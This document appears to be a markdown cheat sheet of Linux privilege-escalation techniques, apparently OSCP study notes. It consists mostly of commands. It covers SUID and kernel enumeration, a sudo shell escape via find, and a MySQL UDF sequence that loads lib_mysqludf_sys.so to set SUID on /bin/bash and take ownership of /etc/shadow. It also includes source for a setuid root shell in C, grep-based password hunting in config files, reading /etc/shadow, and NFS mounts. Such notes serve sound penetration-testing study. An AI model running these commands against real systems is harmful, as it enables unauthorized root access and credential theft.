# **Privilege Escalation - Linux**

**1. SUID -**
```
a. find / -user root -perm -4000 -print 2>/dev/null
b. find / -perm -u=s -type f 2>/dev/null
c. find / -user root -perm -4000 -exec ls -ldb {} \;
d. find / -perm -2 ! -type l -ls 	2>/dev/null 			#oscpvideos
**Found Something?**
d. Look for Nmap, Vim, find, Bash, More, Less, Nano, cp
e. If found follow https://pentestlab.blog/category/privilege-escalation/
```
**2. Check Kernal Version**
```
a. uname -a
b. uname -mrs
c. rpm -q kernel
d. dmesg | grep Linux
e. ls /boot | grep vmlinuz-
f. cat /proc/version
 **Found Something?**
h. If Linux Kernel 2.6.22 < 3.9 - Use Dirty COW - https://www.exploit-db.com/exploits/40616
**Search for exploits**
i. site:exploit-db.com kernel version
j. searchsploit <kernal version>
```
**3. SUDO -**
```
a. sudo -l
b. cat /etc/sudoers
c. Add "/bin/sh" in the current user
d. sudo find /home -exec sh -i \;
e. Follow - https://touhidshaikh.com/blog/?p=790 - find, nano, vim, man, awk, less, nmap, more, wget, apache2
f. Follow - http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/ - zip, tar, strace, tcpdump, nmap, scp, except, nano & pico, git, ftp/gdb
```

**4. CRON JOB**
```
a. systemctl list-timers
b. Follow - https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/
```

**5. Program Running as Root**
```
a. ps
b. ps aux
**MySQL **
c. select sys_exec('whoami');															#1
d. select sys_eval('whoami');															#1
e. select sys_exec('usermod -a -G admin user');										#2
f. select sys_exec('chown user.user /etc/shadow');									#2
g. use mysql;																			#3
h. create table npn(line blob);															#3
i. insert into npn values(load_file('/<path>/lib_mysqludf_sys.so'));				#3
j. select * from npn into dumpfile '/usr/lib/lib_mysqludf_sys.so';					#3
k. create function sys_exec returns integer soname 'lib_mysqludf_sys.so';		#3
l. select sys_exec('chmod u+s /bin/bash');											#3
m. Save file as shell.c in /tmp folder.													#4#~/Desktop/OSCP/OSCP_Payloads/Linux/Mysql/shell.c
	#include <stdio.h>
	#include <sys/types.h>
	#include <unistd.h>
	int main(void)
	{
	setuid(0); setgid(0); system(“/bin/bash”);
	}
n. gcc -o /tmp/shell /home/npn/shell.c												#4
o. select sys_exec('chmod +s /tmp/shell');											#4
p. Follow - Kioptrix 4, Lord of root- **Raptor** - https://highon.coffee/blog/lord-of-the-root-walkthrough/		#s
q. Follow - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
r. Follow - https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html
s. MySQL - **Raptor Udf.c** - https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf.c		#Awesome#p
```

**6. Weak/Reused/plaintext Password**
```
a. grep -i user [filename]
b. grep -i pass [filename]
c. grep -C 5 "password" [filename]
d. find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" 				# Joomla
**Filename**
e. cat /etc/syslog.conf
f. cat /etc/chttp.conf
g. cat /etc/lighttpd.conf
h. cat /etc/cups/cupsd.conf
i. cat /etc/inetd.conf
j. cat /etc/apache2/apache2.conf
k. cat /etc/my.conf
l. cat /etc/httpd/conf/httpd.conf
m. cat /opt/lampp/etc/httpd.conf
n. ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```
**7. Shadow File**
```
a. cat /etc/shadow
```
**8. Files and Permissions**
```
a. /etc/passwd - https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
```
**9. Exploiting Users with "." in their PATH**
```
a. echo $PATH
b. Follow - https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
```
**10. Unmounted File System**
```
a. showmount -e
b. mount <IP>:/ /tmp/
c. Follow - https://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm
```
